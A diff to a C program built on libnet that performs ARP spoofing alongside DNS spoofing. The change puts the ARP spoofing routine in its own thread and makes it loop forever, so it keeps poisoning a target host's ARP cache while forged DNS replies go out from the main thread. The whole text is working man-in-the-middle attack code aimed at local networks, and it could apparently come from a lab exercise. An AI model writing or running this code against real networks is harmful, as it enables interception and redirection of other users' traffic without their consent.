@@ -13,10 +13,17 @@
 #include <string.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
+#include <pthread.h>
 
 #define ETH_ADDR_SIZE 6
 
-void arp_spoof(char *host, char *interface){
+struct arguments{
+	char *host;
+	char *interface;
+};
+
+void* arp_spoof(void *args){
+	struct arguments *my_args = (struct arguments *)args;
   	libnet_t *ln;
 	u_int32_t target_ip_addr, zero_ip_addr;
   	u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
@@ -24,7 +31,8 @@ void arp_spoof(char *host, char *interface){
   	struct libnet_ether_addr* src_hw_addr;
   	char errbuf[LIBNET_ERRBUF_SIZE];
 
-  	if ((ln = libnet_init(LIBNET_LINK, interface, errbuf)) == NULL){
+	while(1){
+  	if ((ln = libnet_init(LIBNET_LINK, my_args->interface, errbuf)) == NULL){
 		printf("arp_spoof: error initializing libnet: %s\n", errbuf);
 		exit(-1);
 	}
@@ -32,7 +40,7 @@ void arp_spoof(char *host, char *interface){
 		printf("arp_spoof: failed to get MAC address\n");
 		exit(-1);
 	}
-  	if ((target_ip_addr = libnet_name2addr4(ln, host, LIBNET_RESOLVE)) == -1){
+  	if ((target_ip_addr = libnet_name2addr4(ln, my_args->host, LIBNET_RESOLVE)) == -1){
 		printf("arp_spoof: failed to get IPv4 address of HOST\n");
 	}
   	zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
@@ -49,6 +57,7 @@ void arp_spoof(char *host, char *interface){
    		ln);                             /* libnet context       */
   	libnet_write(ln);
 	libnet_destroy(ln);
+	}
 }
 
 struct ethhdr{
@@ -248,7 +257,15 @@ int main(int argc, char** argv) {
 		printf("Usage: %s HOST INTERFACE\n", argv[0]);
 		exit(-1);
 	}
-  	arp_spoof(argv[1], argv[2]);	//TODO: call in separate thread, infinite loop
+	struct arguments args;
+	args.host = argv[1];
+	args.interface = argv[2];
+	pthread_t tid;
+	if(pthread_create(&tid, NULL, arp_spoof, (void *)&args) != 0){
+		printf("Failed to create thread\n");
+		exit(-1);
+	}
+  	//arp_spoof(args);	//TODO: call in separate thread, infinite loop
 	dns_spoof(argv[1], argv[2]);
 	
   	return EXIT_SUCCESS;
